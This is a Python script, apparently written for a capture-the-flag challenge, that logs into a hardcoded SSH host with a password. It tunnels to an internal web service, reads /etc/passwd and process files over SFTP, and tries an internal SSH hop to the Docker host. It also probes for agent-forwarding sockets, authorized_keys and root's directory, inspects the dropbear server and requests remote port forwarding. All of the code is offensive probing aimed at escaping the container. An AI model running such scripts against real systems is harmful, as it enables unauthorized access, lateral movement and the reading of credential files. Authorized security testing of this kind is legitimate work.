import paramiko
import socket
import time
import sys
import os

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def check_web_service():
    """检查172.17.0.2的web服务"""
    jump_ssh = paramiko.SSHClient()
    jump_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jump_ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = jump_ssh.get_transport()
    
    print("[*] 连接到172.17.0.2:80...")
    channel = transport.open_channel("direct-tcpip", ('172.17.0.2', 80), ('127.0.0.1', 0), timeout=10)
    
    # 发送HTTP请求
    http_request = b"GET / HTTP/1.1\r\nHost: 172.17.0.2\r\nConnection: close\r\n\r\n"
    channel.sendall(http_request)
    
    response = b""
    while True:
        try:
            channel.settimeout(3)
            data = channel.recv(4096)
            if not data:
                break
            response += data
        except:
            break
    
    print(f"[*] HTTP响应:\n{response.decode('utf-8', errors='ignore')}")
    channel.close()
    jump_ssh.close()

def test_sftp_access():
    """测试SFTP访问"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    try:
        sftp = ssh.open_sftp()
        print("[+] SFTP连接成功")
        
        # 列出目录
        print("[*] 列出根目录:")
        try:
            files = sftp.listdir('/')
            for f in files:
                print(f"  {f}")
        except Exception as e:
            print(f"[-] 列目录失败: {e}")
        
        # 尝试读取一些文件
        paths = ['/proc/1/cmdline', '/etc/passwd', '/init', '/run/host/os-release']
        for path in paths:
            try:
                with sftp.open(path, 'r') as f:
                    content = f.read()
                    print(f"\n[*] {path}:\n{content[:500]}")
            except Exception as e:
                print(f"[-] 读取{path}失败: {e}")
        
        sftp.close()
    except Exception as e:
        print(f"[-] SFTP错误: {e}")
    
    ssh.close()

def test_scp_escape():
    """测试SCP逃逸"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 测试scp命令执行
    # 有些SSH服务器的scp实现可能有漏洞
    print("[*] 测试SCP命令注入...")
    
    # 在内部运行ssh命令
    cmd = "which ssh"
    print(exec_cmd(ssh, cmd))
    
    cmd = "which scp"
    print(exec_cmd(ssh, cmd))
    
    # 尝试通过内部ssh命令连接到宿主机
    cmd = "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ctf@172.17.0.1 id"
    print("[*] 尝试内部SSH连接...")
    print(exec_cmd(ssh, cmd))
    
    ssh.close()

def test_agent_forwarding():
    """测试Agent Forwarding攻击"""
    # 这需要在跳板机上利用agent socket
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查是否有SSH agent socket
    print("[*] 检查SSH agent socket...")
    print(exec_cmd(ssh, "ls -la /tmp/"))
    print(exec_cmd(ssh, "env | grep SSH"))
    print(exec_cmd(ssh, "ls -la /run/"))
    
    ssh.close()

def try_authorized_keys_injection():
    """尝试authorized_keys注入"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查是否可以写入.ssh目录
    print("[*] 检查.ssh目录权限...")
    print(exec_cmd(ssh, "ls -la /root/"))
    print(exec_cmd(ssh, "ls -la ~/.ssh/"))
    print(exec_cmd(ssh, "cat ~/.ssh/authorized_keys"))
    
    ssh.close()

def explore_dropbear():
    """探索dropbear的配置和特性"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查dropbear的版本和配置
    print("[*] 检查dropbear...")
    cmds = [
        "ls -la /sbin/",
        "strings /sbin/dropbear | head -100",
        "/sbin/dropbear --help",
        "cat /proc/$(pgrep dropbear)/cmdline",
    ]
    
    for cmd in cmds:
        print(f"\n[*] {cmd}")
        print(exec_cmd(ssh, cmd))
    
    ssh.close()

def test_global_requests():
    """测试SSH全局请求"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 测试各种全局请求
    print("[*] 测试全局请求...")
    
    # 请求远程端口转发
    try:
        port = transport.request_port_forward('', 12345)
        print(f"[+] 远程端口转发成功，端口: {port}")
    except Exception as e:
        print(f"[-] 远程端口转发: {e}")
    
    # 尝试发送自定义全局请求
    try:
        response = transport.global_request('no-more-sessions@openssh.com', wait=True)
        print(f"[+] no-more-sessions: {response}")
    except Exception as e:
        print(f"[-] no-more-sessions: {e}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] 更多探索")
    print("="*50)
    
    print("\n[1] 检查Web服务")
    check_web_service()
    
    print("\n[2] 测试SFTP")
    test_sftp_access()
    
    print("\n[3] 测试Agent Forwarding")
    test_agent_forwarding()
    
    print("\n[4] 检查authorized_keys")
    try_authorized_keys_injection()
    
    print("\n[5] 探索dropbear")
    explore_dropbear()
